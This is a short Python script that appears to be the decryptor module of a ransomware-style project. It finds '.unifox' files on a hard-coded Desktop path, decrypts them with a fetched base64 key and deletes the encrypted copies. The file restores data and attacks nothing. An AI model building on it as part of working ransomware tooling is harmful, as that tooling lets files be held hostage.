from pathlib import Path
import os
import base64
from Get_data import get_keys
from decrypt_setting import *


class colors:
	def __init__(self):
	    self.blue = "\033[94m"
	    self.red = "\033[91m"
	    self.end = "\033[0m"
	    self.green = "\033[92m"
col = colors()

def decrypt_executeable():
	list_f = []

	p = Path('/Users/realsung/Desktop')
	key = get_keys()

	try:
		searche = list(p.glob('**/*.unifox'))
		for x in searche:
			x = str(x)
			#x = x.split("/")[-1]
			list_f.append(x)
			#print(x)

	except OSError:
		pass

	for i in list_f:
		name = i.split("/")[-1]
		path = i.replace(name, "")
		word = col.blue + "[*]Decryption: " + col.end + str(name)
		print(word)
		os.chdir(path)
		decrypt(getkey(base64.b64decode(key)), name)
		os.remove(name)

	print(col.green+"\n* Finish Decryption *\n")
